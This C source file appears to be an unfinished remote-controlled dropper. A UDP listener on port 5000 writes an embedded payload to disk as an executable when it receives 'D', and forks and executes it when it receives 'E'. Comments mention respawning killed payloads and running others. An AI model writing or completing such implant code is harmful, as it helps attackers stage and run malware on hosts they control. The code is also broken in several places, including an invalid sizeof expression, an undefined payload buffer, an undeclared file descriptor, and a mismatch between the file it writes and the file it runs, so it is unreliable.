#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <wait.h>
#include <fcntl.h>
#include <unistd.h>


unsigned int payload_len = sizeof(payload.h);

int main(void){
	 
	char *ip = "10.60.117.216";
	int port = 5000;

	int sockfd;
	struct sockaddr_in server_addr, client_addr;
	char buffer[2];
	socklen_t addr_size;
	int n;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
	perror("[-]socket error");
	exit(1);
	}

	memset(&server_addr, '\0', sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ip);

	n = bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
	if (n < 0){
	perror("[-]bind error");
	exit(1);
	}

	bzero(buffer, sizeof(buffer));printf("---> %s\n", buffer);
			bzero(buffer, sizeof(buffer));
	addr_size = sizeof(client_addr);
	
		while(1) //this is ther server, everything happens in here 
		{
			recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
			//copy evrything from sockfd into the buffer, starting at bu[0-2], from the client IP addr


			//Step 1: Check to see if the buffer is D or E
			//Step 2: If D, then deploy (need payload compiled, turned into header)
			// use open (file descriptors), to write payload as an executable binary
			//Step 3: If E, the fork, execv the written binaries 
			

			//use strcmp for the buffer to see if D or E
			//strcmp, 0 if both are identical

			if(strcmp(buffer, "D") == 0)
			{
				printf("I got a D\n");
				//payload person would xxd the payload 
				//I include it as a header 
				//two terminals, 1 client and 1 server to test it all

				//fd open and write 

				int payload_fd = open("payload.c", O_WRONLY | O_CREAT | O_TRUNC, 0700);
				write(payload_fd, payload, payload_len);
				close(fd);
			}else if(strcmp(buffer, "E") == 0)
			{
				printf("I got an E\n");
				
				pid_t p1 = 0;
				pid_t parentID = getpid();
				char pbuffer[16];
				sprintf(pbuffer, "%d", parentID);
				char *args[] = {"./payload",  pbuffer, NULL}; //parentID was pbuffer
				int p1fork = fork();
				if( 0 == p1fork)
				{   
					execv(args[0], args);
				}else{
				// do other fun things like execute other
				// payloads or just nothing or respawning
				// killed off payloads
					wait(NULL); // wait for the child to complete
				}

			}
			

			
		}
		bzero(buffer, 2);








return 0;
}
